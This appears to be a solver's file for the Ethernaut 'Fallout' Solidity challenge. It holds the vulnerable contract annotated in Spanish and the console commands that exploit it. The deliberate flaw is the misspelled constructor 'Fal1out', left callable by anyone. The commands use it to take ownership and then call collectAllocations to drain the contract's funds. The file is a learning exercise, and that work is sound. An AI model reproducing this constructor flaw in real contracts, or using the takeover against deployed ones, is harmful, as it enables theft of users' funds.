pragma solidity ^0.4.18;

import 'zeppelin-solidity/contracts/ownership/Ownable.sol';

// Tengo que ser el dueño
contract Fallout is Ownable {

    // mapeo las direcciones a una tabla de alocaciones
  mapping (address => uint) allocations;

  /* constructor */
  // cuando se contruye el contrato, se le asigna la direccion del que lo crea como dueño y el valor que se le manda al contrato, como alocación del dueño en el contrato.
  function Fal1out() payable {
    owner = msg.sender;
    allocations[owner] = msg.value;
  }

  // Asigna en la tabla lo que el nuevo que llama al contrato le manda y lo suma a lo que habia antes
  function allocate() public payable {
    allocations[msg.sender] += msg.value;
  }

  // Transfiere (a donde?? a la direccion que lo llamo?) a la direccion que le paso. solo cuando hay algo en la cuenta en la que le indico, sino salta de ahi
  function sendAllocation(address allocator) public {
    require(allocations[allocator] > 0);
    allocator.transfer(allocations[allocator]);
  }

  // El dueño puede cobrar todo lo que tiene el contrato
  function collectAllocations() public onlyOwner {
    msg.sender.transfer(this.balance);
  }

  // me devuelve cuanto es lo que envio cierta direccion que le pido
  function allocatorBalance(address allocator) public constant returns (uint) {
    return allocations[allocator];
  }
}




await contract.allocate.sendTransaction({from: player, to: contract.address, value: toWei(0.05)})
await contract.allocatorBalance(player)
await contract.sendAllocation(player)
await contract.owner()


//es un hdp, el constructor en realidad tiene un uno metido en vez de una l
await contract.Fal1out.sendTransaction({from: player, to: contract.address, value: toWei(0.05)})
await contract.collectAllocations()
await contract.owner()
